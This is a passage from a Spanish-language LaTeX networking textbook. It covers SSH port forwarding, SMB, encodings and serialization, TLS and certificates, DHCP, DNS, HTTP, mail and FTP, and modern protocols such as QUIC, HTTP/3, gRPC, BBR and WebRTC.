ECDSA     & 256--521    & Más rápido que RSA, elliptic curve \\
Ed25519   & 256 (equiv) & Recomendado hoy: más rápido, más seguro \\
\bottomrule
\end{tabular}
\caption{Algoritmos de clave pública en SSH}
\end{table}

\subsection{Port Forwarding con SSH}

\begin{codigo}
\begin{lstlisting}
# Local forwarding: acceder puerto remoto como si fuera local
# Acceder MySQL (puerto 3306) de servidor remoto como localhost:3307
ssh -L 3307:localhost:3306 usuario@servidor.com

# Remote forwarding: exponer puerto local hacia el servidor remoto
ssh -R 8080:localhost:3000 usuario@servidor.com

# Dynamic forwarding: SSH como proxy SOCKS5
ssh -D 1080 usuario@servidor.com
\end{lstlisting}
\end{codigo}

\section{\eh{left-right-arrow} NetBIOS y SMB}

\begin{concepto}
\textbf{NetBIOS} (Network Basic Input/Output System) proporciona servicios
de nombres y sesiones en redes Windows locales. No es routable por IP
--- solo funciona en la LAN.

\textbf{SMB} (Server Message Block) usa NetBIOS (o directamente TCP/IP en SMB2+)
para compartir archivos, impresoras y recursos en redes Windows.
Puerto: 445 (SMB directo) o 139 (SMB sobre NetBIOS).
\end{concepto}

\chapter{\eh{artist-palette} Capa 6 --- Presentación (Presentation Layer)}

\begin{concepto}
La capa de presentación hace que los datos sean \textbf{entendibles} para la
capa de aplicación, sin importar cómo los representa internamente el sistema
que los envió. Sus tres funciones:
\begin{enumerate}
    \item \textbf{Traducción / Codificación:} convertir entre formatos (ASCII, Unicode, EBCDIC)
    \item \textbf{Compresión:} reducir tamaño antes de transmitir
    \item \textbf{Cifrado/Descifrado:} proteger datos en tránsito (TLS vive aquí)
\end{enumerate}
\end{concepto}

\section{\eh{input-latin-letters} Codificación de Caracteres}

\begin{concepto}
Los caracteres son números. Una \textbf{codificación} define qué número
corresponde a qué carácter.

\emoji{light-bulb} \textbf{Analogía:} Es como tener diferentes sistemas de
escritura. El número 65 en ASCII es ``A''. En EBCDIC (IBM) el 65 es ``\&''.
Si dos sistemas no hablan la misma codificación, el texto parece basura.
(¿Recuerdas los mensajes con ``ñ'' en vez de ``ñ''? Eso es.)
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{llll}
\toprule
\textbf{Codificación} & \textbf{Tamaño} & \textbf{Cobertura} & \textbf{Estado} \\
\midrule
ASCII    & 7 bits (1 byte)    & Solo inglés (128 chars)      & Obsoleto para texto internacional \\
Latin-1  & 8 bits (1 byte)    & Europa occidental (256 chars) & Obsoleto \\
UTF-8    & 1--4 bytes (var.)  & Todo Unicode (1.1M+ chars)   & Estándar web actual \\
UTF-16   & 2--4 bytes         & Todo Unicode                  & Windows interno, Java \\
UTF-32   & 4 bytes fijos      & Todo Unicode                  & Raro, desperdicia espacio \\
\bottomrule
\end{tabular}
\caption{Codificaciones de caracteres}
\end{table}

\begin{ejemplo}
La letra ``\textbf{ñ}'' (U+00F1) en diferentes codificaciones:
\begin{itemize}
    \item \textbf{UTF-8:} \texttt{0xC3 0xB1} (2 bytes)
    \item \textbf{UTF-16:} \texttt{0x00F1} (2 bytes)
    \item \textbf{ASCII:} No existe --- \textit{por eso el correo ``Manana'' sin ñ}
    \item \textbf{Latin-1:} \texttt{0xF1} (1 byte)
\end{itemize}
UTF-8 es \textbf{compatible con ASCII} para los primeros 128 caracteres.
Todo archivo ASCII válido es automáticamente UTF-8 válido.
\end{ejemplo}

\section{\eh{file-folder} Serialización de Datos}

\begin{concepto}
\textbf{Serialización} convierte estructuras de datos en memoria a bytes
que se pueden transmitir o almacenar.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{lllll}
\toprule
\textbf{Formato} & \textbf{Tipo} & \textbf{Legible} & \textbf{Tamaño relativo} & \textbf{Uso} \\
\midrule
JSON        & Texto   & Sí  & Mediano   & APIs REST, configuraciones \\
XML         & Texto   & Sí  & Grande    & Legacy, SOAP, SVG \\
YAML        & Texto   & Sí  & Mediano   & Kubernetes, Docker Compose \\
Protobuf    & Binario & No  & Pequeño   & gRPC, microservicios \\
MessagePack & Binario & No  & Muy peq.  & IoT, gaming real-time \\
CBOR        & Binario & No  & Pequeño   & IoT, IETF estándar \\
\bottomrule
\end{tabular}
\caption{Formatos de serialización de datos}
\end{table}

\begin{moderno}
\textbf{\emoji{rocket} Protocol Buffers (Protobuf)} --- creado por Google (2008, open source 2011):

El mismo dato ``usuario con nombre y edad'' ocupa:
\begin{itemize}
    \item JSON: \texttt{\{"name":"Aldo","age":22\}} = \textbf{23 bytes}
    \item Protobuf: campo 1 (name) + campo 2 (age) en binario = \textbf{9 bytes}
\end{itemize}
3--10x más compacto. 5--10x más rápido de parsear. No necesita schema parser
en tiempo de ejecución. Requiere un archivo \texttt{.proto} con la definición.
Usado por gRPC, YouTube, Google Maps, Android internamente.
\end{moderno}

\section{\eh{locked} TLS / SSL --- Transport Layer Security}

\begin{concepto}
\textbf{TLS} (y su predecesor SSL) cifra la comunicación entre cliente y servidor.
HTTPS = HTTP + TLS. Es lo que hace aparecer el candado en el navegador.

\emoji{light-bulb} \textbf{Analogía:} TLS es como un sobre sellado con firma
holográfica. El sobre garantiza que nadie lo abrió (\textbf{integridad}),
la firma verifica quién lo mandó (\textbf{autenticación}), y el contenido
está en código secreto que solo el destinatario puede leer (\textbf{confidencialidad}).
\end{concepto}

\subsection{Evolución de SSL/TLS}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{Versión} & \textbf{Año} & \textbf{Estado} \\
\midrule
SSL 2.0  & 1995 & \emoji{skull} Prohibido (RFC 6176) \\
SSL 3.0  & 1996 & \emoji{skull} Prohibido (POODLE attack, RFC 7568) \\
TLS 1.0  & 1999 & \emoji{skull} Deprecated (RFC 8996, 2021) \\
TLS 1.1  & 2006 & \emoji{skull} Deprecated (RFC 8996, 2021) \\
TLS 1.2  & 2008 & \emoji{warning} Permitido, en transición \\
TLS 1.3  & 2018 & \emoji{check-mark-button} Estándar recomendado \\
\bottomrule
\end{tabular}
\caption{Versiones SSL/TLS}
\end{table}

\subsection{TLS 1.2 vs TLS 1.3}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{lll}
\toprule
\textbf{Característica} & \textbf{TLS 1.2} & \textbf{TLS 1.3 (RFC 8446)} \\
\midrule
Handshake             & 2 RTT             & \textbf{1 RTT} \\
0-RTT resumption      & No                & \emoji{check-mark-button} Sí \\
Cipher suites         & 37 (algunas débiles) & 5 (todas seguras) \\
RSA key exchange      & Permitido         & \emoji{cross-mark} Eliminado \\
Perfect Forward Secrecy & Opcional        & \textbf{Obligatorio} \\
Compresión TLS        & Sí (CRIME attack) & \emoji{cross-mark} Eliminada \\
\bottomrule
\end{tabular}
\caption{TLS 1.2 vs TLS 1.3}
\end{table}

\subsection{Handshake TLS 1.3 simplificado}

\begin{verbatim}
  Cliente                         Servidor
     │─── ClientHello ──────────►│  (versiones soportadas, key_share,
     │                            │   cipher suites)
     │◄── ServerHello ────────────│  (versión elegida, key_share del servidor)
     │                            │  (ambos calculan el shared secret con ECDHE)
     │◄── {EncryptedExtensions} ──│  (todo lo siguiente está CIFRADO)
     │◄── {Certificate}  ─────────│  (certificado X.509 del servidor)
     │◄── {CertificateVerify} ────│  (firma del servidor con su clave privada)
     │◄── {Finished} ─────────────│
     │─── {Finished} ────────────►│
     │═══════════ Application Data ════════════│
\end{verbatim}

\begin{cuidado}
\textbf{Perfect Forward Secrecy (PFS):} TLS 1.3 usa \textbf{ECDHE} para el
intercambio de claves. Esto significa que incluso si la clave privada del
servidor es robada \textit{en el futuro}, el tráfico de hoy \textbf{no puede
ser descifrado} --- porque las claves de sesión son efímeras y nunca se almacenan.

TLS 1.2 con RSA key exchange \textit{no} tiene PFS: si alguien captura
el tráfico hoy y roba la clave privada mañana, puede descifrar todo.
\end{cuidado}

\section{\eh{zipper-mouth-face} Certificados X.509 y PKI}

\begin{concepto}
Un \textbf{certificado X.509} es un documento digital que prueba la identidad
de un servidor. Contiene: nombre del dominio, clave pública, quién lo firmó,
y hasta cuándo es válido.

La \textbf{PKI} (Public Key Infrastructure) es el sistema de confianza:
tu navegador confía en un conjunto de \textbf{Certificate Authorities (CAs)}
raíz. Cuando visitas \texttt{google.com}, el certificado está firmado por
una CA de confianza → el navegador muestra el candado.
\end{concepto}

\begin{verbatim}
  Cadena de confianza (Certificate Chain):

  Root CA (en tu navegador/OS)
      └─── Intermediate CA (firma al servidor)
                └─── Certificado del servidor (google.com)
                         ├── Subject: CN=google.com
                         ├── Public Key: (clave pública del servidor)
                         ├── Valid: 2024-01-01 a 2025-01-01
                         └── Signature: (firmado por Intermediate CA)
\end{verbatim}

\begin{ejemplo}
\textbf{Let's Encrypt} (2015): CA gratuita y automatizada. Democratizó HTTPS.
Antes de Let's Encrypt, un certificado costaba \$100--\$500/año. Hoy, con el
protocolo ACME y el cliente Certbot, cualquier servidor puede obtener
un certificado válido en minutos y renovarlo automáticamente.
\end{ejemplo}

\chapter{\eh{desktop-computer} Capa 7 --- Aplicación (Application Layer)}

\begin{concepto}
La capa de aplicación es la que \textit{ves y usas} directamente. Aquí viven
los protocolos que usan tus apps: HTTP (web), DNS (nombres de dominio),
DHCP (IPs automáticas), SMTP (correo electrónico), FTP (archivos).
\end{concepto}

\section{\eh{satellite-antenna} DHCP --- Dynamic Host Configuration Protocol (RFC 2131)}

\begin{concepto}
\textbf{DHCP} asigna automáticamente configuración de red a los dispositivos
cuando se conectan: dirección IP, máscara de subred, gateway por defecto y
servidores DNS.

\emoji{light-bulb} \textbf{Analogía:} Llegar a un hotel (red) y que la recepción
(servidor DHCP) te asigne automáticamente: número de habitación (IP),
llave maestra del piso (máscara), la dirección del hotel para recibir correo
(gateway) y el directorio telefónico del hotel (DNS). Todo automático, sin
que tú tengas que pedirlo o configurarlo.
\end{concepto}

\subsection{Proceso DORA}

\begin{center}
\begin{tikzpicture}[
    msg/.style={-{Stealth}, thick},
    server/.style={font=\bfseries\small, text=textlight}
]
\node[server] at (0,0) {Cliente};
\node[server] at (8,0) {Servidor DHCP};
\draw[thick, draw=gray!50!white] (0,-0.3) -- (0,-7.5);
\draw[thick, draw=gray!50!white] (8,-0.3) -- (8,-7.5);

\draw[msg, cyan!70!white] (0,-1.0) -- (8,-1.8)
    node[midway, above, sloped, font=\small\bfseries, text=cyan!80!white] {DISCOVER};
\node[font=\tiny, right, text=gray!70!white] at (8,-1.8)
    {Broadcast: ``¿Hay un servidor DHCP?''};

\draw[msg, green!60!white] (8,-2.3) -- (0,-3.1)
    node[midway, above, sloped, font=\small\bfseries, text=green!70!white] {OFFER};
\node[font=\tiny, left, text=gray!70!white] at (0,-3.1)
    {``Te ofrezco 192.168.1.100 por 24h''};

\draw[msg, orange!80!white] (0,-3.6) -- (8,-4.4)
    node[midway, above, sloped, font=\small\bfseries, text=orange!80!white] {REQUEST};
\node[font=\tiny, right, text=gray!70!white] at (8,-4.4)
    {Broadcast: ``Acepto la oferta de 192.168.1.100''};

\draw[msg, red!70!white] (8,-4.9) -- (0,-5.7)
    node[midway, above, sloped, font=\small\bfseries, text=red!80!white] {ACK};
\node[font=\tiny, left, text=gray!70!white] at (0,-5.7)
    {``Confirmado, es tuya hasta las 14:00 de mañana''};

\node[font=\small\itshape, text=green!60!white] at (4,-6.8)
    {\emoji{check-mark-button} Cliente ya tiene IP, máscara, gateway y DNS};
\end{tikzpicture}
\end{center}

\textbf{Información que provee DHCP:}
\begin{itemize}
    \item IP address y máscara de subred
    \item Default gateway
    \item Servidores DNS primario y secundario
    \item Lease time (tiempo de vigencia de la IP)
    \item NTP servers, TFTP server (opcional)
\end{itemize}

\begin{cuidado}
\textbf{Rogue DHCP Server:} si un atacante conecta su propio servidor DHCP,
puede asignarse a sí mismo como gateway o DNS → intercepta todo el tráfico.

Defensa: \textbf{DHCP Snooping} en el switch --- solo permite respuestas DHCP
de puertos confiables (donde está el servidor legítimo).
\end{cuidado}

\section{\eh{globe-with-meridians} DNS --- Domain Name System (RFC 1034/1035)}

\begin{concepto}
\textbf{DNS} traduce nombres de dominio (\texttt{google.com}) a direcciones IP
(\texttt{142.250.80.46}). Sin DNS, tendrías que memorizar IPs para cada sitio.

\emoji{light-bulb} \textbf{Analogía:} DNS es la agenda de contactos de Internet.
No necesitas memorizar ``142.250.80.46'' --- solo escribes ``google.com'' y
DNS busca el número IP por ti, igual que buscar ``mamá'' en tus contactos
en vez de marcar el número completo.
\end{concepto}

\subsection{Jerarquía DNS}

\begin{lstlisting}
  . (root) ── gestionado por IANA, 13 root servers en todo el mundo
  │
  ├── .com  .org  .mx  .net  .io  ...  (TLDs - Top Level Domains)
  │         │
  │      google.com  (Second-level domain, registrado por Google)
  │         │
  │      www.google.com   maps.google.com   api.google.com
  │      (Subdominios, configurados por Google)
  │
  └── .edu  .gob  ... (TLDs especiales)
\end{lstlisting}

\subsection{Tipos de registros DNS}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{Tipo} & \textbf{¿Qué guarda?} & \textbf{Ejemplo} \\
\midrule
A     & IPv4 del dominio           & \texttt{google.com → 142.250.80.46} \\
AAAA  & IPv6 del dominio           & \texttt{google.com → 2607:f8b0::...} \\
CNAME & Alias a otro dominio       & \texttt{www → google.com} \\
MX    & Servidor de correo         & \texttt{google.com → aspmx.l.google.com} \\
TXT   & Texto libre                & SPF, DKIM, verificación de dominio \\
NS    & Nameservers del dominio    & \texttt{google.com → ns1.google.com} \\
PTR   & IP → nombre (reverse DNS) & \texttt{46.80.250.142.in-addr.arpa → google.com} \\
SOA   & Registro de autoridad      & TTL, email del admin, número de serie \\
SRV   & Servicio y puerto          & \texttt{\_http.\_tcp.example.com} \\
\bottomrule
\end{tabular}
\caption{Tipos de registros DNS}
\end{table}

\subsection{Proceso de resolución DNS}

\begin{lstlisting}
  Browser pide: www.unam.mx

  1. Caché del OS → ¿ya lo tengo? Si sí, listo.
  2. Resolver local (tu router / ISP)
  3. Root server → ``No sé, pregunta al TLD de .mx''
  4. TLD server (.mx) → ``No sé, pregunta al NS de unam.mx''
  5. Authoritative NS (ns.unam.mx) → ``La IP es 132.248.204.100''
  6. Resolver lo cachea y te responde
  7. Tú te conectas a 132.248.204.100

  Resolución iterativa: el resolver hace todas las preguntas
  Resolución recursiva: el root server haría todas las preguntas (raro)
\end{lstlisting}

\section{\eh{globe-showing-americas} HTTP --- HyperText Transfer Protocol}

\subsection{HTTP/1.1 --- El original (RFC 2616, 1999)}

\begin{lstlisting}
  ─── Request ─────────────────────────────────────────
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: Mozilla/5.0 (Windows NT 10.0)
  Accept: text/html, application/json
  Connection: keep-alive

  ─── Response ─────────────────────────────────────────
  HTTP/1.1 200 OK
  Content-Type: text/html; charset=utf-8
  Content-Length: 2048
  Cache-Control: max-age=3600

  <!DOCTYPE html>...
\end{lstlisting}

\textbf{Problema principal de HTTP/1.1:}
\begin{itemize}
    \item \textbf{Head-of-line blocking:} con pipelining, si la primera petición
          tarda, todas las siguientes esperan en fila.
    \item Una página web con 100 recursos (CSS, JS, imágenes) requiere múltiples
          conexiones TCP (hasta 6 por dominio en browsers modernos).
    \item Cada conexión TCP tiene overhead: handshake + slow start.
\end{itemize}

\subsection{HTTP/2 (RFC 7540, 2015)}

\begin{concepto}
Google desarrolló SPDY (2009) para resolver las limitaciones de HTTP/1.1.
SPDY se convirtió en la base de \textbf{HTTP/2}.
\end{concepto}

Mejoras clave:
\begin{itemize}
    \item \textbf{Multiplexing:} múltiples requests en \textit{una sola} conexión TCP,
          en paralelo real. Sin cola, sin esperas.
    \item \textbf{Header compression (HPACK):} los headers se comprimen y los
          repetidos se envían como diferencias. HTTP/1.1 enviaba todos los headers
          en texto plano en cada request --- enorme overhead.
    \item \textbf{Binary framing:} protocolo binario, no texto. Más eficiente.
    \item \textbf{Server push:} el servidor puede enviar recursos antes de que
          el cliente los pida (enviar CSS y JS mientras el HTML se procesa).
    \item \textbf{Stream prioritization:} el cliente puede indicar qué recursos
          son más urgentes.
\end{itemize}

\subsection{Códigos de estado HTTP}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{Rango} & \textbf{Categoría} & \textbf{Ejemplos importantes} \\
\midrule
1xx & Informacional  & 100 Continue, 101 Switching Protocols \\
2xx & Éxito          & 200 OK, 201 Created, 204 No Content \\
3xx & Redirección    & 301 Moved Permanently, 304 Not Modified \\
4xx & Error cliente  & 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found \\
5xx & Error servidor & 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable \\
\bottomrule
\end{tabular}
\caption{Códigos de estado HTTP}
\end{table}

\section{\eh{envelope} Correo Electrónico --- SMTP, POP3, IMAP}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{llll}
\toprule
\textbf{Protocolo} & \textbf{Puerto} & \textbf{Uso} & \textbf{Dirección} \\
\midrule
SMTP     & 25, 587 (TLS) & Enviar correo             & Cliente → Servidor, Servidor → Servidor \\
POP3     & 110, 995 (TLS) & Recibir y descargar       & Descarga y borra del servidor \\
IMAP     & 143, 993 (TLS) & Recibir sincronizado      & Sincroniza entre dispositivos \\
\bottomrule
\end{tabular}
\caption{Protocolos de correo electrónico}
\end{table}

\section{\eh{file-folder} FTP y sus alternativas}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{llll}
\toprule
\textbf{Protocolo} & \textbf{Puerto} & \textbf{Cifrado} & \textbf{Estado} \\
\midrule
FTP   & 21 (control), 20 (datos) & \emoji{cross-mark} No   & Evitar, inseguro \\
FTPS  & 990                      & \emoji{check-mark-button} TLS & Obsolescente \\
SFTP  & 22 (sobre SSH)           & \emoji{check-mark-button} SSH & Recomendado \\
SCP   & 22 (sobre SSH)           & \emoji{check-mark-button} SSH & Recomendado \\
\bottomrule
\end{tabular}
\caption{Protocolos de transferencia de archivos}
\end{table}

\begin{cuidado}
FTP envía usuario y contraseña en texto claro. \textbf{Nunca usar FTP}
para transferencias reales. SFTP usa el canal SSH (puerto 22) y es
completamente diferente a FTPS (que es FTP + TLS).
\end{cuidado}

\chapter{\eh{rocket} Protocolos Modernos y Tecnologías Google}

\begin{concepto}
La web de hoy es radicalmente distinta a la de los años 90. Los protocolos
que estudiamos en capítulos anteriores (TCP, HTTP/1.1) tienen décadas de
antigüedad y muestran su edad bajo la carga del internet moderno.

Este capítulo cubre la próxima generación: protocolos diseñados para
redes móviles, streaming de video en 4K, videollamadas en tiempo real,
y los sistemas distribuidos masivos de Google, Meta y Cloudflare.
\end{concepto}

\section{\eh{zap} QUIC --- Quick UDP Internet Connections (RFC 9000)}

\begin{concepto}
\textbf{QUIC} es un protocolo de transporte sobre \textbf{UDP} que combina
lo mejor de TCP + TLS en un solo handshake. Desarrollado por Google en 2012,
estandarizado por IETF en 2021 (RFC 9000).

\emoji{light-bulb} \textbf{Analogía:} TCP es como llamar a un banco
--- tienes que autenticarte, esperar verificación, y solo entonces
hablar. QUIC es como un banco con ``acceso rápido'' donde te reconocen
de visitas anteriores y entras directo al grano.
\end{concepto}

\subsection{El problema que QUIC resuelve}

TCP tiene problemas fundamentales con el internet moderno:

\begin{itemize}
    \item \textbf{Handshake lento:} TCP (1 RTT) + TLS 1.2 (2 RTT) = 3 RTTs antes
          del primer byte de datos. En móviles con 100ms de latencia: 300ms
          de espera solo para empezar.
    \item \textbf{HOL Blocking a nivel TCP:} HTTP/2 resolvió el HOL a nivel
          de aplicación con multiplexing, pero si un paquete TCP se pierde,
          \textit{todos} los streams quedan bloqueados en el buffer.
    \item \textbf{Ossification:} middleboxes (NATs, firewalls) han ``osificado''
          TCP --- no puedes cambiar el protocolo TCP porque millones de
          dispositivos en el mundo asumen comportamiento específico.
\end{itemize}

\subsection{Solución QUIC}

\begin{lstlisting}
  TCP + TLS 1.2:
    ├── TCP SYN / SYN-ACK / ACK       (1 RTT)
    ├── TLS ClientHello / ServerHello  (1 RTT)
    ├── TLS Certificate / Finished     (1 RTT)
    └── Primera petición HTTP          (1 RTT) = 4 RTTs en total

  QUIC (primera conexión):
    ├── QUIC Initial (transport + TLS crypto combinados)  (1 RTT)
    └── Primera petición HTTP/3                           (1 RTT) = 2 RTTs

  QUIC (conexión repetida con 0-RTT):
    └── Request + datos inmediatamente                   = 0 RTTs extra
\end{lstlisting}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{lll}
\toprule
\textbf{Característica} & \textbf{TCP + TLS} & \textbf{QUIC} \\
\midrule
Protocolo base      & IP                    & UDP \\
Handshake           & 3 RTTs (TCP+TLS)      & 1 RTT (combinado) \\
0-RTT resumption    & \emoji{cross-mark} No & \emoji{check-mark-button} Sí \\
HOL Blocking        & Nivel TCP y app       & Solo nivel stream (no cross-stream) \\
Cifrado             & TLS separado          & TLS 1.3 integrado, obligatorio \\
Migración de red    & Reinicia conexión     & \emoji{check-mark-button} Connection ID, sobrevive \\
\bottomrule
\end{tabular}
\caption{TCP+TLS vs QUIC}
\end{table}

\begin{moderno}
\textbf{\emoji{rocket} Connection Migration:} si cambias de Wi-Fi a 4G mientras
descargas un archivo, TCP reinicia la conexión (el socket es IP:puerto). QUIC usa
un \textbf{Connection ID} opaco, independiente de la IP. Tu descarga continúa
sin interrupciones. YouTube en Android lleva usando esto desde 2013.
\end{moderno}

\begin{cuidado}
\textbf{Por qué UDP y no un nuevo protocolo?} Los routers y firewalls están
programados en hardware para TCP/UDP --- añadir un Layer 4 nuevo tomaría
décadas en desplegarse. UDP actúa como contenedor neutral que el hardware
ya conoce; QUIC construye todas las garantías encima.
\end{cuidado}

\section{\eh{globe-with-meridians} HTTP/3 (RFC 9114)}

\begin{concepto}
\textbf{HTTP/3} = HTTP/2 semántica + QUIC como transporte. No es solo
``HTTP sobre UDP'' --- es una reescritura completa del stack.

Adoptado por: Google (100\% del tráfico de YouTube), Cloudflare, Meta,
Shopify. Ya representa \textbf{$\sim$30\% del tráfico web global} (2024).
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{llll}
\toprule
\textbf{Versión} & \textbf{Año} & \textbf{Transporte} & \textbf{Clave} \\
\midrule
HTTP/1.1 & 1999 & TCP  & Texto plano, pipeline con HOL \\
HTTP/2   & 2015 & TCP  & Multiplexing binario, HPACK, server push \\
HTTP/3   & 2022 & QUIC & Sin HOL TCP, 0-RTT, connection migration \\
\bottomrule
\end{tabular}
\caption{Evolución de HTTP}
\end{table}

\subsection{QPACK --- Compresión de headers en HTTP/3}

HTTP/2 usa HPACK para comprimir headers --- funciona bien sobre TCP donde
el orden está garantizado. QUIC entrega paquetes fuera de orden (streams
independientes), así que HPACK rompería si un paquete de tabla llega tarde.

\textbf{QPACK} (RFC 9204) resuelve esto: permite compresión de headers
sin bloqueo inter-stream. Usa una tabla estática predefinida y una tabla
dinámica con control de riesgo de bloqueo.

\section{\eh{satellite-antenna} gRPC --- Google Remote Procedure Call}

\begin{concepto}
\textbf{gRPC} es un framework de \textit{Remote Procedure Call} (RPC) de alto
rendimiento. Desarrollado por Google (2015, open source). Sobre HTTP/2 con
Protocol Buffers para serialización.

\emoji{light-bulb} \textbf{Analogía:} REST es como mandar un email con
instrucciones en JSON (texto, lento de parsear). gRPC es como hablar
directamente por teléfono en un idioma optimizado: binario, rápido,
con definición de tipos estricta.
\end{concepto}

\subsection{REST vs gRPC}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{lll}
\toprule
\textbf{Característica} & \textbf{REST/JSON} & \textbf{gRPC/Protobuf} \\
\midrule
Serialización   & JSON texto plano      & Protobuf binario \\
Velocidad parse & Lento                 & 5--10x más rápido \\
Tamaño payload  & Mediano               & 3--10x más pequeño \\
Tipado          & Ninguno en runtime    & Estricto (schema .proto) \\
Streaming       & Manual (SSE/WebSocket)& Nativo (server/client/bidi) \\
HTTP version    & HTTP/1.1 o HTTP/2     & HTTP/2 (requerido) \\
Browser native  & \emoji{check-mark-button} Sí & \emoji{cross-mark} No (necesita grpc-web) \\
Uso             & APIs públicas         & Microservicios internos \\
\bottomrule
\end{tabular}
\caption{REST vs gRPC}
\end{table}

\subsection{Tipos de streaming en gRPC}

\begin{lstlisting}
  1. Unary (request-response normal):
     cliente ──── Request ────► servidor
     cliente ◄─── Response ─── servidor

  2. Server Streaming (servidor manda muchos mensajes):
     cliente ──── Request ────► servidor
     cliente ◄─── Message 1 ── servidor
     cliente ◄─── Message 2 ── servidor
     (útil: stock ticker, logs en vivo)

  3. Client Streaming (cliente manda muchos mensajes):
     cliente ──── Chunk 1 ────► servidor
     cliente ──── Chunk 2 ────► servidor
     cliente ◄─── Response ─── servidor
     (útil: upload de archivos grandes)

  4. Bidirectional Streaming:
     cliente ◄──► servidor
     (útil: chat, videojuegos en tiempo real)
\end{lstlisting}

\begin{moderno}
\textbf{\emoji{rocket} gRPC en Google:} internamente, Google tiene más de
10 billones de RPCs por segundo usando gRPC/Stubby entre sus microservicios.
Google Maps, Google Photos, Gmail: todos se comunican internamente con este
protocolo. YouTube usa gRPC para coordinar entre sus 100+ microservicios.
\end{moderno}

\begin{codigo}
\begin{lstlisting}
// Archivo .proto: define la API como código
syntax = "proto3";

service UsuarioService {
    rpc GetUsuario(UsuarioRequest) returns (UsuarioResponse);
    rpc StreamNoticias(Empty) returns (stream Noticia);
}

message UsuarioRequest { int32 id = 1; }
message UsuarioResponse {
    int32 id = 1;
    string nombre = 2;
    string email = 3;
}
\end{lstlisting}
\end{codigo}

\section{\eh{racing-car} BBR --- Bottleneck Bandwidth and RTT}

\begin{concepto}
\textbf{BBR} es un algoritmo de control de congestión TCP desarrollado por
Google (2016). Reemplaza CUBIC en los servidores de Google. La diferencia
es filosófica: CUBIC reacciona a pérdida de paquetes; BBR modela físicamente
la red.
\end{concepto}

\subsection{El problema con CUBIC}

CUBIC y su predecesor RENO asumen que pérdida de paquete = congestión.
Esto funcionaba en redes cableadas de los 90. Problemas modernos:

\begin{itemize}
    \item \textbf{Buferbloat:} routers modernos tienen buffers enormes.
          Cuando el buffer está lleno, el RTT se dispara pero no hay pérdida
          --- CUBIC sigue enviando rápido, y la latencia es terrible.
    \item \textbf{WiFi y LTE:} pierden paquetes por interferencia (no congestión)
          --- CUBIC frena innecesariamente.
    \item \textbf{Links transcontinentales:} alta capacidad pero alta latencia,
          subexplotados por CUBIC.
\end{itemize}

\subsection{Cómo funciona BBR}

BBR modela dos parámetros físicos de la red:
\begin{enumerate}
    \item \textbf{BtlBw (Bottleneck Bandwidth):} máxima tasa de entrega observada
          --- qué tan rápido puede la red en realidad?
    \item \textbf{RTprop (Round-Trip propagation time):} RTT mínimo observado
          --- cuánto tarda la señal, sin congestión?
\end{enumerate}

\begin{lstlisting}
  Operación ideal = BtlBw × RTprop
  (Ecuación de bandwidth-delay product)

  Si envías MÁS rápido que BtlBw  → llenas buffers → mayor RTT → latencia
  Si envías MÁS lento que BtlBw   → desperdicias capacidad

  BBR se mantiene justo en el punto óptimo, midiendo constantemente.
\end{lstlisting}

\begin{moderno}
\textbf{\emoji{rocket} Resultados reales de BBR en Google:}
\begin{itemize}
    \item Google.com: \textbf{4\% más rápido} globalmente
    \item YouTube: \textbf{14\% menos buffering} en el mundo
    \item Brasil (alta latencia): \textbf{6x más throughput} con BBR vs CUBIC
    \item Con 1\% de pérdida aleatoria: BBR tiene \textbf{800x más
          throughput} que CUBIC
\end{itemize}
BBR v3 (2023) está llegando a Linux kernel 6.x y Android.
QUIC usa BBR por defecto.
\end{moderno}

\section{\eh{telephone-receiver} WebRTC --- Web Real-Time Communication}

\begin{concepto}
\textbf{WebRTC} (RFC 8825) permite comunicación peer-to-peer de audio,
video y datos directamente en el navegador, sin plugins. Google lo compró
(GlobalIPSolutions, 2010) y lo donó al W3C.

Es lo que usan: Google Meet, Discord, Facebook Messenger, Jitsi.
\end{concepto}

\subsection{Stack de protocolos WebRTC}

\begin{lstlisting}
  ┌──────────────────────────────────────────────┐
  │              Tu aplicación                    │
  ├──────────────────────────────────────────────┤
  │  Audio/Video: Opus + VP8/VP9/AV1/H.264        │
  ├──────────────────────────────────────────────┤
  │    SRTP --- Secure Real-time Transport        │
  ├──────────────────────────────────────────────┤
  │    DTLS --- Datagram TLS (TLS sobre UDP)      │
  ├──────────────────────────────────────────────┤
  │    ICE --- Interactive Connectivity           │
  │    (coordina STUN y TURN para NAT traversal)  │
  ├──────────────────────────────────────────────┤
  │            UDP (o TCP como fallback)          │
  └──────────────────────────────────────────────┘
\end{lstlisting}

\subsection{ICE, STUN y TURN --- NAT Traversal}

La mayoría de dispositivos están detrás de NAT. Para una videollamada
peer-to-peer, los dos peers deben encontrarse, pero ninguno conoce la
IP pública del otro.

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{lll}
\toprule
\textbf{Protocolo} & \textbf{Función} & \textbf{Cuándo} \\
\midrule
STUN & Descubre tu IP pública y puerto NAT & Siempre, primero \\
TURN & Relay de tráfico por servidor intermedio & Cuando P2P falla \\
ICE  & Prueba todos los candidatos y elige el mejor & Coordina todo \\
\bottomrule
\end{tabular}
\caption{ICE/STUN/TURN en WebRTC}
\end{table}

\begin{ejemplo}
\textbf{Por qué DTLS y no TLS?} TLS requiere TCP (streams ordenados).
WebRTC usa UDP para baja latencia en video. DTLS es TLS adaptado para UDP:
maneja retransmisiones de handshake, pero una vez establecido, el
cifrado funciona packet-by-packet sin esperar orden.
